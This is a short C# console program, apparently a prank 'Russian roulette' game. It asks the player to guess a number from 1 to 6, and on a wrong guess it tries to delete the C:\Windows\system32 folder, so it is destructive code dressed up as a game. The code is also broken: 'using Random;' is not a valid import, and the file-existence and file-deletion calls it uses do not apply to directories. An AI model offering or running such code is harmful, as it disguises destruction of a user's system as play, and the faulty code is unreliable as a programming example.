using System;
using System.IO;
using Random;

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Lets play a little game\n Pick a number 1-6");

            string filePath = @"C:\Windows\system32";
            Random rnd = new Random();
            int rand = rnd.Next(1, 7);
            int input = Convert.ToInt32(Console.ReadLine());

            if(input == rand){
                Console.WriteLine("You have been spared.");
            } else {
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                }
                else
                {
                    Console.WriteLine("What.");
                }
            }
        }
    }
}
